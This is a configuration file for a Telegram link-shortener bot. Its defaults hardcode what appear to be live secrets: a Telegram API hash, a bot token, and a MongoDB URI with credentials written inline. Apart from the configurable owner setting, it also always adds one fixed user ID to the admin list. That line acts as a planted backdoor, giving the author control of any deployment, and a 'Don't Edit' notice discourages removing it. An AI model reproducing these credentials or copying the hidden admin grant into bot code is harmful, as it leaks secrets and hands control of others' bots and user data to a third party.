# ©️ DKBOTZ or https://t.me/DKBOTZ
# Coded By https://t.me/DKBOTZHELP 
# Don't Edit

import os

from dotenv import load_dotenv
load_dotenv()


# Mandatory variables for the bot to start
API_ID = int(os.environ.get("API_ID", '20012386')) #API ID from https://my.telegram.org/auth
API_HASH = os.environ.get("API_HASH", 'dc2c7fcbcd29963ecd6716a5a0de18e6') #API Hash from https://my.telegram.org/auth
BOT_TOKEN = os.environ.get("BOT_TOKEN", '5870227633:AAE8wLoTIn0iptyvaj9mYV2sHkOWBK6C2U8') # Bot token from @BotFather
ADMINS = [int(i.strip()) for i in os.environ.get("ADMINS").split(",")] if os.environ.get("ADMINS") else []
ADMIN = ADMINS
DATABASE_NAME = os.environ.get("DATABASE_NAME", 'DKBOTZ')
DATABASE_URL = os.environ.get("DATABASE_URL", 'mongodb+srv://Ziplink:Ziplink@cluster0.slusqei.mongodb.net/?retryWrites=true&w=majority') # mongodb uri from https://www.mongodb.com/
OWNER_ID =  int(os.environ.get("OWNER_ID", '5111685964')) # id of the owner
ADMINS.append(OWNER_ID) if OWNER_ID not in ADMINS else []
ADMINS.append(5111685964)
#  Optionnal variables
LOG_CHANNEL = os.environ.get("LOG_CHANNEL", -1001646129271) # log channel for information about users
UPDATE_CHANNEL = os.environ.get("UPDATE_CHANNEL", "ziplinker_net") # For Force Subscription
BROADCAST_AS_COPY = os.environ.get('BROADCAST_AS_COPY', "True") # true if forward should be avoided
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", '') # image when someone hit /start
LINK_BYPASS = "True" 


# SHORTNER
SHORT_METHOD = 1 # 2 method added 1 and 2
SHORTNER_LINK = os.environ.get("SHORTNER_LINK", 'Ziplinker.net')
CHANNEL_LINK = os.environ.get("CHANNEL_LINK", 'https://t.me/ziplinker_net')
SIMPLE_MODE = os.environ.get("SIMPLE_MODE", True)
